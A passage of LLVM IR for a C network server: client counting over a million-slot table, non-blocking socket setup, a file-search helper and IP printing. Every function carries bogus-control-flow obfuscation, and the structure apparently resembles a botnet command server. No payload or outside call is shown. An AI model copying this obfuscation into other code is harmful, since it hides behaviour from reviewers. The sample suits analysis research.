  %32 = urem i32 %31, 2
  %33 = icmp eq i32 %32, 0
  %34 = icmp slt i32 %29, 10
  %35 = or i1 %33, %34
  br i1 %35, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %27
  %36 = load i32, i32* %4, align 4
  %37 = or i32 %36, 2048
  store i32 %37, i32* %4, align 4
  %38 = load i32, i32* %3, align 4
  %39 = load i32, i32* %4, align 4
  %40 = call i32 (i32, i32, ...) @fcntl(i32 %38, i32 4, i32 %39)
  store i32 %40, i32* %5, align 4
  %41 = load i32, i32* %5, align 4
  %42 = icmp eq i32 %41, -1
  %43 = load i32, i32* @x.9
  %44 = load i32, i32* @y.10
  %45 = sub i32 %43, 1
  %46 = mul i32 %43, %45
  %47 = urem i32 %46, 2
  %48 = icmp eq i32 %47, 0
  %49 = icmp slt i32 %44, 10
  %50 = or i1 %48, %49
  br i1 %50, label %originalBBpart213, label %originalBB1alteredBB

originalBBpart213:                                ; preds = %originalBB1
  br i1 %42, label %51, label %52

; <label>:51:                                     ; preds = %originalBBpart213
  call void @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.108, i32 0, i32 0))
  store i32 -1, i32* %2, align 4
  br label %69

; <label>:52:                                     ; preds = %originalBBpart213
  %53 = load i32, i32* @x.9
  %54 = load i32, i32* @y.10
  %55 = sub i32 %53, 1
  %56 = mul i32 %53, %55
  %57 = urem i32 %56, 2
  %58 = icmp eq i32 %57, 0
  %59 = icmp slt i32 %54, 10
  %60 = or i1 %58, %59
  br i1 %60, label %originalBB15, label %originalBB15alteredBB

originalBB15:                                     ; preds = %originalBB15alteredBB, %52
  store i32 0, i32* %2, align 4
  %61 = load i32, i32* @x.9
  %62 = load i32, i32* @y.10
  %63 = sub i32 %61, 1
  %64 = mul i32 %61, %63
  %65 = urem i32 %64, 2
  %66 = icmp eq i32 %65, 0
  %67 = icmp slt i32 %62, 10
  %68 = or i1 %66, %67
  br i1 %68, label %originalBBpart217, label %originalBB15alteredBB

originalBBpart217:                                ; preds = %originalBB15
  br label %69

; <label>:69:                                     ; preds = %originalBBpart217, %51, %originalBBpart2
  %70 = load i32, i32* %2, align 4
  ret i32 %70

originalBBalteredBB:                              ; preds = %originalBB, %10
  call void @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.108, i32 0, i32 0))
  store i32 -1, i32* %2, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %27
  %71 = load i32, i32* %4, align 4
  %_ = shl i32 %71, 2048
  %_2 = sub i32 %71, 2048
  %gen = mul i32 %_2, 2048
  %_3 = sub i32 %71, 2048
  %gen4 = mul i32 %_3, 2048
  %_5 = shl i32 %71, 2048
  %_6 = sub i32 %71, 2048
  %gen7 = mul i32 %_6, 2048
  %_8 = sub i32 0, %71
  %gen9 = add i32 %_8, 2048
  %_10 = sub i32 0, %71
  %gen11 = add i32 %_10, 2048
  %72 = or i32 %71, 2048
  store i32 %72, i32* %4, align 4
  %73 = load i32, i32* %3, align 4
  %74 = load i32, i32* %4, align 4
  %75 = call i32 (i32, i32, ...) @fcntl(i32 %73, i32 4, i32 %74)
  store i32 %75, i32* %5, align 4
  %76 = load i32, i32* %5, align 4
  %77 = icmp eq i32 %76, -1
  br label %originalBB1

originalBB15alteredBB:                            ; preds = %originalBB15, %52
  store i32 0, i32* %2, align 4
  br label %originalBB15
}

; Function Attrs: nounwind
declare i32 @epoll_ctl(i32, i32, i32, %struct.epoll_event*) #4

declare i32 @fprintf(%struct._IO_FILE*, i8*, ...) #1

declare i32 @fflush(%struct._IO_FILE*) #1

declare i32 @printf(i8*, ...) #1

declare i32 @fcntl(i32, i32, ...) #1

; Function Attrs: noinline nounwind uwtable
define i32 @clientsConnected() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  store i32 0, i32* %2, align 4
  store i32 0, i32* %1, align 4
  br label %3

; <label>:3:                                      ; preds = %65, %0
  %4 = load i32, i32* @x.11
  %5 = load i32, i32* @y.12
  %6 = sub i32 %4, 1
  %7 = mul i32 %4, %6
  %8 = urem i32 %7, 2
  %9 = icmp eq i32 %8, 0
  %10 = icmp slt i32 %5, 10
  %11 = or i1 %9, %10
  br i1 %11, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %3
  %12 = load i32, i32* %1, align 4
  %13 = icmp slt i32 %12, 1000000
  %14 = load i32, i32* @x.11
  %15 = load i32, i32* @y.12
  %16 = sub i32 %14, 1
  %17 = mul i32 %14, %16
  %18 = urem i32 %17, 2
  %19 = icmp eq i32 %18, 0
  %20 = icmp slt i32 %15, 10
  %21 = or i1 %19, %20
  br i1 %21, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %13, label %22, label %68

; <label>:22:                                     ; preds = %originalBBpart2
  %23 = load i32, i32* @x.11
  %24 = load i32, i32* @y.12
  %25 = sub i32 %23, 1
  %26 = mul i32 %23, %25
  %27 = urem i32 %26, 2
  %28 = icmp eq i32 %27, 0
  %29 = icmp slt i32 %24, 10
  %30 = or i1 %28, %29
  br i1 %30, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %22
  %31 = load i32, i32* %1, align 4
  %32 = sext i32 %31 to i64
  %33 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %32
  %34 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %33, i32 0, i32 3
  %35 = load i8, i8* %34, align 1
  %36 = icmp ne i8 %35, 0
  %37 = load i32, i32* @x.11
  %38 = load i32, i32* @y.12
  %39 = sub i32 %37, 1
  %40 = mul i32 %37, %39
  %41 = urem i32 %40, 2
  %42 = icmp eq i32 %41, 0
  %43 = icmp slt i32 %38, 10
  %44 = or i1 %42, %43
  br i1 %44, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %36, label %46, label %45

; <label>:45:                                     ; preds = %originalBBpart24
  br label %65

; <label>:46:                                     ; preds = %originalBBpart24
  %47 = load i32, i32* @x.11
  %48 = load i32, i32* @y.12
  %49 = sub i32 %47, 1
  %50 = mul i32 %47, %49
  %51 = urem i32 %50, 2
  %52 = icmp eq i32 %51, 0
  %53 = icmp slt i32 %48, 10
  %54 = or i1 %52, %53
  br i1 %54, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %46
  %55 = load i32, i32* %2, align 4
  %56 = add nsw i32 %55, 1
  store i32 %56, i32* %2, align 4
  %57 = load i32, i32* @x.11
  %58 = load i32, i32* @y.12
  %59 = sub i32 %57, 1
  %60 = mul i32 %57, %59
  %61 = urem i32 %60, 2
  %62 = icmp eq i32 %61, 0
  %63 = icmp slt i32 %58, 10
  %64 = or i1 %62, %63
  br i1 %64, label %originalBBpart216, label %originalBB6alteredBB

originalBBpart216:                                ; preds = %originalBB6
  br label %65

; <label>:65:                                     ; preds = %originalBBpart216, %45
  %66 = load i32, i32* %1, align 4
  %67 = add nsw i32 %66, 1
  store i32 %67, i32* %1, align 4
  br label %3

; <label>:68:                                     ; preds = %originalBBpart2
  %69 = load i32, i32* @x.11
  %70 = load i32, i32* @y.12
  %71 = sub i32 %69, 1
  %72 = mul i32 %69, %71
  %73 = urem i32 %72, 2
  %74 = icmp eq i32 %73, 0
  %75 = icmp slt i32 %70, 10
  %76 = or i1 %74, %75
  br i1 %76, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %68
  %77 = load i32, i32* %2, align 4
  %78 = load i32, i32* @x.11
  %79 = load i32, i32* @y.12
  %80 = sub i32 %78, 1
  %81 = mul i32 %78, %80
  %82 = urem i32 %81, 2
  %83 = icmp eq i32 %82, 0
  %84 = icmp slt i32 %79, 10
  %85 = or i1 %83, %84
  br i1 %85, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  ret i32 %77

originalBBalteredBB:                              ; preds = %originalBB, %3
  %86 = load i32, i32* %1, align 4
  %87 = icmp slt i32 %86, 1000000
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %22
  %88 = load i32, i32* %1, align 4
  %89 = sext i32 %88 to i64
  %90 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %89
  %91 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %90, i32 0, i32 3
  %92 = load i8, i8* %91, align 1
  %93 = icmp ne i8 %92, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %46
  %94 = load i32, i32* %2, align 4
  %_ = sub i32 0, %94
  %gen = add i32 %_, 1
  %_7 = sub i32 %94, 1
  %gen8 = mul i32 %_7, 1
  %_9 = sub i32 %94, 1
  %gen10 = mul i32 %_9, 1
  %_11 = sub i32 0, %94
  %gen12 = add i32 %_11, 1
  %_13 = sub i32 %94, 1
  %gen14 = mul i32 %_13, 1
  %95 = add nsw i32 %94, 1
  store i32 %95, i32* %2, align 4
  br label %originalBB6

originalBB18alteredBB:                            ; preds = %originalBB18, %68
  %96 = load i32, i32* %2, align 4
  br label %originalBB18
}

; Function Attrs: noinline nounwind uwtable
define i32 @joinn() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca [1000000 x i8], align 16
  store i32 0, i32* %4, align 4
  br label %6

; <label>:6:                                      ; preds = %originalBBpart2, %0
  %7 = load i32, i32* %4, align 4
  %8 = icmp slt i32 %7, 40
  br i1 %8, label %9, label %33

; <label>:9:                                      ; preds = %6
  %10 = load i32, i32* %4, align 4
  %11 = sext i32 %10 to i64
  %12 = getelementptr inbounds [40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 %11
  %13 = getelementptr inbounds %struct.name, %struct.name* %12, i32 0, i32 1
  store i32 0, i32* %13, align 4
  br label %14

; <label>:14:                                     ; preds = %9
  %15 = load i32, i32* @x.13
  %16 = load i32, i32* @y.14
  %17 = sub i32 %15, 1
  %18 = mul i32 %15, %17
  %19 = urem i32 %18, 2
  %20 = icmp eq i32 %19, 0
  %21 = icmp slt i32 %16, 10
  %22 = or i1 %20, %21
  br i1 %22, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %14
  %23 = load i32, i32* %4, align 4
  %24 = add nsw i32 %23, 1
  store i32 %24, i32* %4, align 4
  %25 = load i32, i32* @x.13
  %26 = load i32, i32* @y.14
  %27 = sub i32 %25, 1
  %28 = mul i32 %25, %27
  %29 = urem i32 %28, 2
  %30 = icmp eq i32 %29, 0
  %31 = icmp slt i32 %26, 10
  %32 = or i1 %30, %31
  br i1 %32, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %6

; <label>:33:                                     ; preds = %6
  store i32 0, i32* %2, align 4
  br label %34

; <label>:34:                                     ; preds = %originalBBpart222, %33
  %35 = load i32, i32* %2, align 4
  %36 = icmp slt i32 %35, 1000000
  br i1 %36, label %37, label %109

; <label>:37:                                     ; preds = %34
  %38 = load i32, i32* @x.13
  %39 = load i32, i32* @y.14
  %40 = sub i32 %38, 1
  %41 = mul i32 %38, %40
  %42 = urem i32 %41, 2
  %43 = icmp eq i32 %42, 0
  %44 = icmp slt i32 %39, 10
  %45 = or i1 %43, %44
  br i1 %45, label %originalBB4, label %originalBB4alteredBB

originalBB4:                                      ; preds = %originalBB4alteredBB, %37
  store i32 0, i32* %3, align 4
  %46 = load i32, i32* @x.13
  %47 = load i32, i32* @y.14
  %48 = sub i32 %46, 1
  %49 = mul i32 %46, %48
  %50 = urem i32 %49, 2
  %51 = icmp eq i32 %50, 0
  %52 = icmp slt i32 %47, 10
  %53 = or i1 %51, %52
  br i1 %53, label %originalBBpart26, label %originalBB4alteredBB

originalBBpart26:                                 ; preds = %originalBB4
  br label %54

; <label>:54:                                     ; preds = %86, %originalBBpart26
  %55 = load i32, i32* %3, align 4
  %56 = icmp slt i32 %55, 40
  br i1 %56, label %57, label %89

; <label>:57:                                     ; preds = %54
  %58 = load i32, i32* %2, align 4
  %59 = sext i32 %58 to i64
  %60 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %59
  %61 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %60, i32 0, i32 2
  %62 = getelementptr inbounds [512 x i8], [512 x i8]* %61, i32 0, i32 0
  %63 = load i32, i32* %3, align 4
  %64 = sext i32 %63 to i64
  %65 = getelementptr inbounds [40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 %64
  %66 = getelementptr inbounds %struct.name, %struct.name* %65, i32 0, i32 0
  %67 = getelementptr inbounds [512 x i8], [512 x i8]* %66, i32 0, i32 0
  %68 = call i32 @strcmp(i8* %62, i8* %67) #8
  %69 = icmp eq i32 %68, 0
  br i1 %69, label %70, label %85

; <label>:70:                                     ; preds = %57
  %71 = load i32, i32* %2, align 4
  %72 = sext i32 %71 to i64
  %73 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %72
  %74 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %73, i32 0, i32 3
  %75 = load i8, i8* %74, align 1
  %76 = sext i8 %75 to i32
  %77 = icmp eq i32 %76, 1
  br i1 %77, label %78, label %85

; <label>:78:                                     ; preds = %70
  %79 = load i32, i32* %3, align 4
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds [40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 %80
  %82 = getelementptr inbounds %struct.name, %struct.name* %81, i32 0, i32 1
  %83 = load i32, i32* %82, align 4
  %84 = add nsw i32 %83, 1
  store i32 %84, i32* %82, align 4
  br label %85

; <label>:85:                                     ; preds = %78, %70, %57
  br label %86

; <label>:86:                                     ; preds = %85
  %87 = load i32, i32* %3, align 4
  %88 = add nsw i32 %87, 1
  store i32 %88, i32* %3, align 4
  br label %54

; <label>:89:                                     ; preds = %54
  br label %90

; <label>:90:                                     ; preds = %89
  %91 = load i32, i32* @x.13
  %92 = load i32, i32* @y.14
  %93 = sub i32 %91, 1
  %94 = mul i32 %91, %93
  %95 = urem i32 %94, 2
  %96 = icmp eq i32 %95, 0
  %97 = icmp slt i32 %92, 10
  %98 = or i1 %96, %97
  br i1 %98, label %originalBB8, label %originalBB8alteredBB

originalBB8:                                      ; preds = %originalBB8alteredBB, %90
  %99 = load i32, i32* %2, align 4
  %100 = add nsw i32 %99, 1
  store i32 %100, i32* %2, align 4
  %101 = load i32, i32* @x.13
  %102 = load i32, i32* @y.14
  %103 = sub i32 %101, 1
  %104 = mul i32 %101, %103
  %105 = urem i32 %104, 2
  %106 = icmp eq i32 %105, 0
  %107 = icmp slt i32 %102, 10
  %108 = or i1 %106, %107
  br i1 %108, label %originalBBpart222, label %originalBB8alteredBB

originalBBpart222:                                ; preds = %originalBB8
  br label %34

; <label>:109:                                    ; preds = %34
  %110 = load i32, i32* %1, align 4
  ret i32 %110

originalBBalteredBB:                              ; preds = %originalBB, %14
  %111 = load i32, i32* %4, align 4
  %_ = sub i32 0, %111
  %gen = add i32 %_, 1
  %_1 = shl i32 %111, 1
  %_2 = sub i32 %111, 1
  %gen3 = mul i32 %_2, 1
  %112 = add nsw i32 %111, 1
  store i32 %112, i32* %4, align 4
  br label %originalBB

originalBB4alteredBB:                             ; preds = %originalBB4, %37
  store i32 0, i32* %3, align 4
  br label %originalBB4

originalBB8alteredBB:                             ; preds = %originalBB8, %90
  %113 = load i32, i32* %2, align 4
  %_9 = shl i32 %113, 1
  %_10 = shl i32 %113, 1
  %_11 = sub i32 %113, 1
  %gen12 = mul i32 %_11, 1
  %_13 = sub i32 %113, 1
  %gen14 = mul i32 %_13, 1
  %_15 = sub i32 0, %113
  %gen16 = add i32 %_15, 1
  %_17 = shl i32 %113, 1
  %_18 = shl i32 %113, 1
  %_19 = sub i32 %113, 1
  %gen20 = mul i32 %_19, 1
  %114 = add nsw i32 %113, 1
  store i32 %114, i32* %2, align 4
  br label %originalBB8
}

; Function Attrs: noinline nounwind uwtable
define i32 @Search_in_File(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca %struct._IO_FILE*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [512 x i8], align 16
  store i8* %0, i8** %3, align 8
  store i32 0, i32* %5, align 4
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  %9 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.16, i32 0, i32 0))
  store %struct._IO_FILE* %9, %struct._IO_FILE** %4, align 8
  %10 = icmp eq %struct._IO_FILE* %9, null
  br i1 %10, label %11, label %12

; <label>:11:                                     ; preds = %1
  store i32 -1, i32* %2, align 4
  br label %106

; <label>:12:                                     ; preds = %1
  %13 = load i32, i32* @x.15
  %14 = load i32, i32* @y.16
  %15 = sub i32 %13, 1
  %16 = mul i32 %13, %15
  %17 = urem i32 %16, 2
  %18 = icmp eq i32 %17, 0
  %19 = icmp slt i32 %14, 10
  %20 = or i1 %18, %19
  br i1 %20, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %12
  %21 = load i32, i32* @x.15
  %22 = load i32, i32* @y.16
  %23 = sub i32 %21, 1
  %24 = mul i32 %21, %23
  %25 = urem i32 %24, 2
  %26 = icmp eq i32 %25, 0
  %27 = icmp slt i32 %22, 10
  %28 = or i1 %26, %27
  br i1 %28, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %29

; <label>:29:                                     ; preds = %59, %originalBBpart2
  %30 = load i32, i32* @x.15
  %31 = load i32, i32* @y.16
  %32 = sub i32 %30, 1
  %33 = mul i32 %30, %32
  %34 = urem i32 %33, 2
  %35 = icmp eq i32 %34, 0
  %36 = icmp slt i32 %31, 10
  %37 = or i1 %35, %36
  br i1 %37, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %29
  %38 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i32 0, i32 0
  %39 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %40 = call i8* @fgets(i8* %38, i32 512, %struct._IO_FILE* %39)
  %41 = icmp ne i8* %40, null
  %42 = load i32, i32* @x.15
  %43 = load i32, i32* @y.16
  %44 = sub i32 %42, 1
  %45 = mul i32 %42, %44
  %46 = urem i32 %45, 2
  %47 = icmp eq i32 %46, 0
  %48 = icmp slt i32 %43, 10
  %49 = or i1 %47, %48
  br i1 %49, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %41, label %50, label %62

; <label>:50:                                     ; preds = %originalBBpart24
  %51 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i32 0, i32 0
  %52 = load i8*, i8** %3, align 8
  %53 = call i8* @strstr(i8* %51, i8* %52) #8
  %54 = icmp ne i8* %53, null
  br i1 %54, label %55, label %59

; <label>:55:                                     ; preds = %50
  %56 = load i32, i32* %6, align 4
  %57 = add nsw i32 %56, 1
  store i32 %57, i32* %6, align 4
  %58 = load i32, i32* %5, align 4
  store i32 %58, i32* %7, align 4
  br label %59

; <label>:59:                                     ; preds = %55, %50
  %60 = load i32, i32* %5, align 4
  %61 = add nsw i32 %60, 1
  store i32 %61, i32* %5, align 4
  br label %29

; <label>:62:                                     ; preds = %originalBBpart24
  %63 = load i32, i32* @x.15
  %64 = load i32, i32* @y.16
  %65 = sub i32 %63, 1
  %66 = mul i32 %63, %65
  %67 = urem i32 %66, 2
  %68 = icmp eq i32 %67, 0
  %69 = icmp slt i32 %64, 10
  %70 = or i1 %68, %69
  br i1 %70, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %62
  %71 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %72 = icmp ne %struct._IO_FILE* %71, null
  %73 = load i32, i32* @x.15
  %74 = load i32, i32* @y.16
  %75 = sub i32 %73, 1
  %76 = mul i32 %73, %75
  %77 = urem i32 %76, 2
  %78 = icmp eq i32 %77, 0
  %79 = icmp slt i32 %74, 10
  %80 = or i1 %78, %79
  br i1 %80, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %72, label %81, label %84

; <label>:81:                                     ; preds = %originalBBpart28
  %82 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %83 = call i32 @fclose(%struct._IO_FILE* %82)
  br label %84

; <label>:84:                                     ; preds = %81, %originalBBpart28
  %85 = load i32, i32* %6, align 4
  %86 = icmp eq i32 %85, 0
  br i1 %86, label %87, label %88

; <label>:87:                                     ; preds = %84
  store i32 0, i32* %2, align 4
  br label %106

; <label>:88:                                     ; preds = %84
  %89 = load i32, i32* @x.15
  %90 = load i32, i32* @y.16
  %91 = sub i32 %89, 1
  %92 = mul i32 %89, %91
  %93 = urem i32 %92, 2
  %94 = icmp eq i32 %93, 0
  %95 = icmp slt i32 %90, 10
  %96 = or i1 %94, %95
  br i1 %96, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %88
  %97 = load i32, i32* %7, align 4
  store i32 %97, i32* %2, align 4
  %98 = load i32, i32* @x.15
  %99 = load i32, i32* @y.16
  %100 = sub i32 %98, 1
  %101 = mul i32 %98, %100
  %102 = urem i32 %101, 2
  %103 = icmp eq i32 %102, 0
  %104 = icmp slt i32 %99, 10
  %105 = or i1 %103, %104
  br i1 %105, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %106

; <label>:106:                                    ; preds = %originalBBpart212, %87, %11
  %107 = load i32, i32* @x.15
  %108 = load i32, i32* @y.16
  %109 = sub i32 %107, 1
  %110 = mul i32 %107, %109
  %111 = urem i32 %110, 2
  %112 = icmp eq i32 %111, 0
  %113 = icmp slt i32 %108, 10
  %114 = or i1 %112, %113
  br i1 %114, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %106
  %115 = load i32, i32* %2, align 4
  %116 = load i32, i32* @x.15
  %117 = load i32, i32* @y.16
  %118 = sub i32 %116, 1
  %119 = mul i32 %116, %118
  %120 = urem i32 %119, 2
  %121 = icmp eq i32 %120, 0
  %122 = icmp slt i32 %117, 10
  %123 = or i1 %121, %122
  br i1 %123, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  ret i32 %115

originalBBalteredBB:                              ; preds = %originalBB, %12
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %29
  %124 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i32 0, i32 0
  %125 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %126 = call i8* @fgets(i8* %124, i32 512, %struct._IO_FILE* %125)
  %127 = icmp ne i8* %126, null
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %62
  %128 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %129 = icmp ne %struct._IO_FILE* %128, null
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %88
  %130 = load i32, i32* %7, align 4
  store i32 %130, i32* %2, align 4
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %106
  %131 = load i32, i32* %2, align 4
  br label %originalBB14
}

declare %struct._IO_FILE* @fopen(i8*, i8*) #1

declare i8* @fgets(i8*, i32, %struct._IO_FILE*) #1

declare i32 @fclose(%struct._IO_FILE*) #1

; Function Attrs: noinline nounwind uwtable
define void @client_addr(i64, i64) #0 {
  %3 = load i32, i32* @x.17
  %4 = load i32, i32* @y.18
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca %struct.sockaddr_in, align 4
  %12 = bitcast %struct.sockaddr_in* %11 to { i64, i64 }*
  %13 = getelementptr inbounds { i64, i64 }, { i64, i64 }* %12, i32 0, i32 0
  store i64 %0, i64* %13, align 4
  %14 = getelementptr inbounds { i64, i64 }, { i64, i64 }* %12, i32 0, i32 1
  store i64 %1, i64* %14, align 4
  %15 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 2
  %16 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %15, i32 0, i32 0
  %17 = load i32, i32* %16, align 4
  %18 = and i32 %17, 255
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 2
  %20 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %19, i32 0, i32 0
  %21 = load i32, i32* %20, align 4
  %22 = and i32 %21, 65280
  %23 = lshr i32 %22, 8
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 2
  %25 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %24, i32 0, i32 0
  %26 = load i32, i32* %25, align 4
  %27 = and i32 %26, 16711680
  %28 = lshr i32 %27, 16
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 2
  %30 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %29, i32 0, i32 0
  %31 = load i32, i32* %30, align 4
  %32 = and i32 %31, -16777216
  %33 = lshr i32 %32, 24
  %34 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.17, i32 0, i32 0), i32 %18, i32 %23, i32 %28, i32 %33)
  %35 = load i32, i32* @x.17
  %36 = load i32, i32* @y.18
  %37 = sub i32 %35, 1
  %38 = mul i32 %35, %37
  %39 = urem i32 %38, 2
  %40 = icmp eq i32 %39, 0
  %41 = icmp slt i32 %36, 10
  %42 = or i1 %40, %41
  br i1 %42, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %2
  %43 = alloca %struct.sockaddr_in, align 4
  %44 = bitcast %struct.sockaddr_in* %43 to { i64, i64 }*
  %45 = getelementptr inbounds { i64, i64 }, { i64, i64 }* %44, i32 0, i32 0
  store i64 %0, i64* %45, align 4
  %46 = getelementptr inbounds { i64, i64 }, { i64, i64 }* %44, i32 0, i32 1
  store i64 %1, i64* %46, align 4
  %47 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %43, i32 0, i32 2
  %48 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %47, i32 0, i32 0
  %49 = load i32, i32* %48, align 4
  %_ = sub i32 %49, 255
  %gen = mul i32 %_, 255
  %_1 = sub i32 0, %49
  %gen2 = add i32 %_1, 255
  %50 = and i32 %49, 255
  %51 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %43, i32 0, i32 2
  %52 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %51, i32 0, i32 0
  %53 = load i32, i32* %52, align 4
  %_3 = sub i32 %53, 65280
  %gen4 = mul i32 %_3, 65280
  %54 = and i32 %53, 65280
  %_5 = sub i32 0, %54
  %gen6 = add i32 %_5, 8
  %_7 = shl i32 %54, 8
  %_8 = sub i32 0, %54
  %gen9 = add i32 %_8, 8
  %_10 = sub i32 %54, 8
  %gen11 = mul i32 %_10, 8
  %55 = lshr i32 %54, 8
  %56 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %43, i32 0, i32 2
  %57 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %56, i32 0, i32 0
  %58 = load i32, i32* %57, align 4
  %_12 = sub i32 0, %58
  %gen13 = add i32 %_12, 16711680
  %_14 = sub i32 0, %58
  %gen15 = add i32 %_14, 16711680
  %_16 = sub i32 %58, 16711680
  %gen17 = mul i32 %_16, 16711680
  %_18 = sub i32 0, %58
  %gen19 = add i32 %_18, 16711680
  %59 = and i32 %58, 16711680
  %_20 = sub i32 0, %59
  %gen21 = add i32 %_20, 16
  %_22 = shl i32 %59, 16
  %60 = lshr i32 %59, 16
  %61 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %43, i32 0, i32 2
  %62 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %61, i32 0, i32 0
  %63 = load i32, i32* %62, align 4
  %_23 = sub i32 %63, -16777216
  %gen24 = mul i32 %_23, -16777216
  %_25 = shl i32 %63, -16777216
  %_26 = sub i32 0, %63
  %gen27 = add i32 %_26, -16777216
  %_28 = shl i32 %63, -16777216
  %64 = and i32 %63, -16777216
  %_29 = sub i32 0, %64
  %gen30 = add i32 %_29, 24
  %_31 = sub i32 %64, 24
  %gen32 = mul i32 %_31, 24
  %_33 = sub i32 0, %64
  %gen34 = add i32 %_33, 24
  %_35 = sub i32 0, %64
  %gen36 = add i32 %_35, 24
  %_37 = sub i32 %64, 24
  %gen38 = mul i32 %_37, 24
  %65 = lshr i32 %64, 24
  %66 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.17, i32 0, i32 0), i32 %50, i32 %55, i32 %60, i32 %65)
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
